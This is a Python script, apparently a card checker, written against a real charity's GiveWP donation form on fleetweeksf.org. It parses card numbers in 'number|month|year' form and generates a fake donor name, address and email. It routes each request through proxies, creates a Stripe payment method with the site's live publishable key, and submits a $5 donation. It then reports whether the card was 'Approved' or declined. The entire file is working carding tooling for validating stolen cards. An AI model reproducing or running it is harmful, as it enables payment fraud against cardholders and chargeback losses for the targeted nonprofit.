import random
import aiohttp
import asyncio
import json
import names
import platform
import ssl
import certifi
import names
import random_address
from bs4 import BeautifulSoup
genaddr = random_address.real_random_address()
address = genaddr['address1']
try: 
    City = genaddr['city']
except KeyError:
    City = "FL"
State = genaddr['state']
Zip_Code = genaddr['postalCode']
first = names.get_first_name()
last = names.get_last_name()
if platform.system()=='Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(10000,999999)}@gmail.com"

if platform.system()=='Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

async def ShopifyPayeezy(cc, proxyrand):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=conn) as session:
        splitter = cc.split('|')
        ccnum    = splitter[0]
        mes      = splitter[1]
        ano      = splitter[2]

        max_retries = 3
        retry_delay = 1
        for retry in range(max_retries):
            try:
                #---------------------------------REQUEST NUMERO 1------------------------------#
                #---------------------------------REQUEST NUMERO 1------------------------------#   
                try:     
                    session.headers.update({
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                        'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                        # 'Accept-Encoding': 'gzip, deflate, br',
                        'Referer': 'https://fleetweeksf.org/',
                        'Alt-Used': 'fleetweeksf.org',
                        'Connection': 'keep-alive',
                    })
                    async with session.get('https://fleetweeksf.org/give/donation-form?giveDonationFormInIframe=1', proxy=str(proxyrand), timeout=18) as resp:        
                        response = await resp.text()
                        soup = BeautifulSoup(response , 'lxml')
                        formid = soup.find("input", {"name": "give-form-id"})["value"]
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 01. It was not generated correctly [UnboundLocalError]. ♻️'  
                except TypeError :
                    return 'An unexpected error occurred in request 01. It was not generated correctly [TypeError]. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 01. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 2------------------------------#
                #---------------------------------REQUEST NUMERO 2------------------------------#
                CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000,9999999)}@gmail.com"
                try :
                    data = {
                        'action': 'give_donation_form_reset_all_nonce',
                        'give_form_id': formid,
                    }
                    async with session.post('https://fleetweeksf.org/wp-admin/admin-ajax.php', data=data, proxy=str(proxyrand), timeout=18) as resp:       
                        response = await resp.json()  
                        give_form_hash = response['data']['give_form_hash']
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 02. It was not generated correctly [TypeError]. ♻️'
                except TypeError :
                    return 'An unexpected error occurred in request 02. It was not generated correctly [TypeError]. ♻️'
                except KeyError :
                    return 'An unexpected error occurred in request 02. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 3------------------------------#
                #---------------------------------REQUEST NUMERO 3------------------------------#
                try :
                    data = f'type=card&billing_details[name]={first}+{last}&billing_details[email]={CorreoRand}&billing_details[address][line1]={address}&billing_details[address][line2]=&billing_details[address][city]={City}&billing_details[address][state]={State}&billing_details[address][postal_code]={Zip_Code}&billing_details[address][country]=US&card[number]={ccnum}&card[cvc]=&card[exp_month]={mes}&card[exp_year]={ano}&guid=38b4dac1-034f-4fae-ab55-aa2ae4b4ace37b02d9&muid=efd3381e-e1d3-4fe0-9e90-38ef20159a8911cfb4&sid=f8e79fbc-8359-4b20-8258-be77de7bf7dff633d5&pasted_fields=number&payment_user_agent=stripe.js%2F48e3ef6612%3B+stripe-js-v3%2F48e3ef6612&time_on_page={random.randint(10000,99999)}&key=pk_live_SMtnnvlq4TpJelMdklNha8iD&_stripe_account=acct_1JYGHaG6c7XVClYu'
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0',
                        'Accept': 'application/json',
                        'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                        # 'Accept-Encoding': 'gzip, deflate, br',
                        'Referer': 'https://js.stripe.com/',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': 'https://js.stripe.com',
                        'Connection': 'keep-alive',
                        'Sec-Fetch-Dest': 'empty',
                        'Sec-Fetch-Mode': 'cors',
                        'Sec-Fetch-Site': 'same-site',
                    }
                    async with session.post('https://api.stripe.com/v1/payment_methods', proxy=str(proxyrand),headers=headers,data=data, timeout=18) as resp:
                        response = await resp.json()
                        responsetexto = await resp.text()
                        if int(responsetexto.find('"decline_code"')) > 0 :
                            ree = response['error']['decline_code']
                            ree = str(ree).replace('_'," ").title()
                            await session.close()
                            return ree
                        elif int(responsetexto.find('"code"')) >= 0 :
                            ree = response['error']['code']
                            ree = str(ree).replace('_'," ").title()
                            await session.close()
                            return ree
                        idstripe = response['id']
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 03. It was not generated correctly [UnboundLocalError]. ♻️'  
                except TypeError :
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                except KeyError :
                    return 'An unexpected error occurred in request 03. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------REQUEST NUMERO 3------------------------------#
                #---------------------------------REQUEST NUMERO 3------------------------------#
                try :
                    data = {
                        'give-fee-amount': '0.46',
                        'give-fee-mode-enable': 'false',
                        'give-fee-status': 'enabled',
                        'give-honeypot': '',
                        'give-form-id-prefix': f'{formid}-1',
                        'give-form-id': formid,
                        'give-form-title': 'Donation Form',
                        'give-current-url': 'https://fleetweeksf.org/donate/',
                        'give-form-url': 'https://fleetweeksf.org/give/donation-form/',
                        'give-form-minimum': '5',
                        'give-form-maximum': '1000000',
                        'give-form-hash': give_form_hash,
                        'give-price-id': 'custom',
                        'give-recurring-logged-in-only': '',
                        'give-logged-in-only': '1',
                        '_give_is_donation_recurring': '0',
                        'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
                        'give-amount': '5',
                        'give-recurring-period-donors-choice': 'quarter',
                        'give_stripe_payment_method': idstripe,
                        'give-fee-recovery-settings': '{"fee_data":{"all_gateways":{"percentage":"2.900000","base_amount":"0.300000","give_fee_disable":false,"give_fee_status":true,"is_break_down":true,"maxAmount":"0"}},"give_fee_status":true,"give_fee_disable":false,"is_break_down":true,"fee_mode":"donor_opt_in","is_fee_mode":true,"fee_recovery":true}',
                        'address_1': address,
                        'city': City,
                        'state': State,
                        'zip_code': Zip_Code,
                        'give_first': first,
                        'give_last': last,
                        'give_email': CorreoRand,
                        'payment-mode': 'stripe',
                        'give_action': 'purchase',
                        'give-gateway': 'stripe',
                        'give_embed_form': '1',
                    }
                    async with session.post(f'https://fleetweeksf.org/give/donation-form/?payment-mode=stripe&form-id={formid}', data=data, proxy=str(proxyrand), timeout=18) as resp:        
                        response = await resp.text()
                except UnboundLocalError :
                    return 'An unexpected error occurred in request 03. It was not generated correctly [UnboundLocalError]. ♻️'  
                except TypeError :
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                except KeyError :
                    return 'An unexpected error occurred in request 03. It was not generated correctly [KeyError]. ♻️'
                except aiohttp.client_exceptions.ClientHttpProxyError as e:
                    print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
                    if retry < max_retries-1:
                        print(f"Reintentando en {retry_delay} segundo...")
                        await asyncio.sleep(retry_delay)
                    else:
                        print(f"No se pudo conectar después de {max_retries} intentos.") 
                        return "Maximum number of retries reached: 3"
                #---------------------------------CHECCK REQUESTS------------------------------#
                if int(response.find('Donation Confirmation')) > 0:
                    return "Approved", "Charged 5$"
                elif int(response.find('Error creating payment intent with Stripe. Please try again.')) > 0 :
                    return f"Payment Intent Error"
                elif int(response.find('3d_secure')) > 0 :
                    await session.close()
                    return "3D_Secure_2"
                else :
                    print(response)
                    return "An unexpected error occurred in response. It was not generated correctly. ⚠️"
            except (aiohttp.client_exceptions.ServerDisconnectedError):
                return "An unexpected error occurred. ServerDisconnectedError. ♻️"
            except (asyncio.exceptions.TimeoutError):
                return "An unexpected error occurred. Timeout Error. ♻️"
            except (aiohttp.client_exceptions.ClientConnectorError):
                return "An unexpected error occurred. ClientConnectorError. ♻️"
            finally:
                 await session.close()